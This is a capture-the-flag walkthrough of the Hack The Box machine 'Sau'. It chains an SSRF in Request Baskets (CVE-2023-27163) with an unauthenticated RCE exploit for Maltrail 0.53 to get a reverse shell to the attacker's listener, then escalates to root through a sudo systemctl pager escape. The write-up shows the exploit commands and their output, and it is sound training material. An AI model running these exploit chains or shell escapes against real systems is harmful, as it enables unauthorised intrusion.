# Introduction

Sau is an Easy machine on Hack The Box that focuses on exploiting two vulnerabilities to ultimately obtain initial access. Privilege escalation is then achieved by exploiting a legitimate binary.

# Enumeration
Nmap reveals three ports:
- 22
- 80
- 55555

```shell
 nmap -sV -sC -T4 10.129.82.3 -oA nmap-sau

SSH is a dead end and port 80 is filtered, but browsing to `http://10.129.82.3:55555` lands on a site titled **Request Baskets**.

## What's Request Baskets?
Request Baskets is a concept, often implemented as a tool or a service, used to capture, inspect, and debug HTTP requests. It provides a temporary "basket" or "bucket" that captures incoming HTTP requests for analysis. This is particularly useful for debugging webhooks, HTTP clients, or other services that send HTTP requests.

An implementation usually works like this:

1. **Create** a new Request Basket, which provides a unique URL endpoint.
2. **Configure** the application, webhook, or service to send HTTP requests to the URL.
3. **Inspect** the incoming HTTP requests to the basket
4. Use the captured information,  to **test or debug issues**, validate payloads, or run other types of tests.

We can see that this particular implementation is on version 1.2.1, which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163"> *CVE-2023–27163 - a Server-Side Request Forgery (SSRF)*</a>

## What's SSRF?
SSRF, or Server-Side Request Forgery, is a security vulnerability that allows an attacker to make requests to internal resources within an organization's network, effectively bypassing firewalls. In SSRF attacks, ***the attacker manipulates a vulnerable web application to make requests to an internal resource,*** which could be anything from cloud services to databases or even restricted parts of the web application itself.

The attack often occurs when a web application doesn't properly validate or sanitise user input for URLs. An attacker can then trick the server into making an unauthorised request to internal resources, potentially revealing sensitive information or even executing commands.

It's particularly concerning in cloud environments, where metadata APIs can expose sensitive data that can lead to more severe attacks like privilege escalation.

Prevention often involves input validation, restricting outbound requests from the server, or implementing allow lists for permissible URLs.

# Attack vector
Given port 80 is filtered but  there is an implementation of Request Baskets on port 55555 that is vulnerable to SSRF, this appears to provide a way to forward requests to the service running on port 80. A PoC of the SSRF vulnerability on Request-Baskets can be found [here](https://github.com/entr0pie/CVE-2023-27163).

## Testing
Creating a new basket in the web app and then configuring port 80 as the forward URL on a local interface can confirm this.

Hovering over the `Proxy Response` option, we can see it will *Proxy the response from the forward url back to the client*.

Checking this option will return the response from `http://localhost:80`.

Triggering a request by browsing to `http://10.129.82.3:55555/wnnyr21` returns a seemingly malformed web app called **Maltrail**.
<img src="/assets/img/2023-sau/20231016-sau-5.png" class="auto-resize">

The app is running version 0.53 which is vulnerable to a **Remote Code Execution.**

```shell
┌──(kali㉿kali)-[~]
└─$ searchsploit maltrail
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Maltrail v0.53 - Unauthenticated Remote Code Executi | python/webapps/51676.py
```

# Initial access
Using the first exploit, a basket can be created that, when accessed, will make a request to `http://localhost:80`, as tested manually.

```shell
┌──(kali㉿kali)-[~/Documents/HTB-Machines/sau/exploits]
└─$ ./CVE-2023-27163.sh http://10.129.82.3:55555/ http://localhost:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "ndapra" proxy basket...
> Basket created!
> Accessing http://10.129.82.3:55555/ndapra now makes the server request to http://localhost:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"uQW06XHLrVKiZsq2XbeXRbrb6PRlQ53tTAVeaA-Puolb"}
```

This basket can then be used to proxy the second exploit to the vulnerable implementation of Maltrail.

```shell
┌──(kali㉿kali)-[~/Documents/HTB-Machines/sau/exploits]
└─$ python3 51676.py 10.10.14.12 4321  http://10.129.82.3:55555/ndapra
Running exploit on http://10.129.82.3:55555/ndapra/login
```

The payload is executed on the Maltrail instance running on port 80, and a reverse shell is sucessfully caught on the listener.

# Privilege escalation
Privilege escalation is reasonably straight forward.

Checking what the user can run as sudo returns one binary: 
`/usr/bin/systemctl status trail.service`

```shell
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

[GTFOBIns](https://gtfobins.github.io/gtfobins/systemctl/) says the following about `systemctl` ran as sudo:

> *If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.*


Running the binary seems to drop into a new terminal session:
```shell
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
```

Attempting to execute a new shell from this terminal will spawn it under sudo:
```shell
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh
!//bbiinn//sshh!/bin/sh
# whoami
whoami
root
```

Done and dusted!
